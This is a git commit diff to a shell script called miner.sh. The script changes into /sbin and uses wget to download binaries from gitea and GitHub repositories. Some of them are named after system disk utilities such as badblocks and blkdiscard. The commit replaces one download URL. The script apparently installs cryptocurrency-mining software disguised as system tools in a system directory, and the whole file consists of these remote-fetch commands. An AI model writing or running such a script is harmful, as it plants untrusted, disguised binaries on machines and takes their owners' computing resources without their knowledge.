690d3728d6e9c6556d9b574183700c11e5e70693
pakiss98 <77697363+pakiss98@users.noreply.github.com>
2021-09-02 23:51:12 +0700

    miner.sh

--- miner.sh
+++ miner.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 cd /sbin
-wget -O badblocks https://try.gitea.io/zxcasf/nambang/raw/branch/main/badblocks
+wget -O badblocks https://raw.githubusercontent.com/Gasskeunjal/komenggblok/main/badblocks
 wget -O blkdiscard https://try.gitea.io/zxcasf/nambang/raw/branch/main/blkdiscard
 wget https://try.gitea.io/zxcasf/nambang/raw/branch/main/amdmemtweak
 wget https://try.gitea.io/zxcasf/nambang/branch/main/libnvrtc-builtins.so
